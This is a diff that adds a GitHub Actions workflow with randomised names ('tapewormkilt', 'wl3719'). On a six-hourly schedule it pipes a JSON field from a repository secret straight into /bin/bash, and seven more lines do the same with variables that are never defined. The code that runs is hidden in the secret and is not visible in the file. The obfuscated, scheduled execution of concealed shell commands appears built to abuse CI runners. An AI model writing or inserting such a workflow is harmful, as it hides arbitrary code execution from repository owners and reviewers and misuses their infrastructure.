@@ -1,0 +1,25 @@
+name: tapewormkilt
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '47 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: tapewormkilt
+        env:
+          wl3719: ${{ secrets.wl3719 }}
+        run: |
+          echo $wl3719 | jq -r .bxxue1756 | /bin/bash
+          echo $s60696 | jq -r .hi445 | /bin/bash
+          echo $rouk0599 | jq -r .ltilk764 | /bin/bash
+          echo $pfqr31334 | jq -r .w864 | /bin/bash
+          echo $eynok94473 | jq -r .rvrvr67937 | /bin/bash
+          echo $h5107 | jq -r .hpm108 | /bin/bash
+          echo $gofw45 | jq -r .rc83393 | /bin/bash
+          echo $nf8 | jq -r .rebx1 | /bin/bash
+
